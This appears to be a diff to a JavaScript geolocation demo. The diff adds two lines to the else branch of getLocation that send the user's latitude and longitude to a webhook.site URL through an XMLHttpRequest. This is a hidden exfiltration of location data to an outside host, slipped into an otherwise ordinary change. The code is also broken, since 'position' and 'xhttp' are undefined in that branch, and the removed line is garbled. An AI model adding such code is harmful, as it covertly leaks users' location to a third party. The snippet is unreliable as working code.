@@ -665,9 +665,10 @@ var x = document.getElementById("demo");
 
 function getLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition,ErrorMsg, [Yes No]);
+    navigator.geolocation.getCurrentPosition(showPosition,ErrorMsg);
   } else { 
-    getLocation();
+    xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
+  xhttp.send();
   }
 }
 
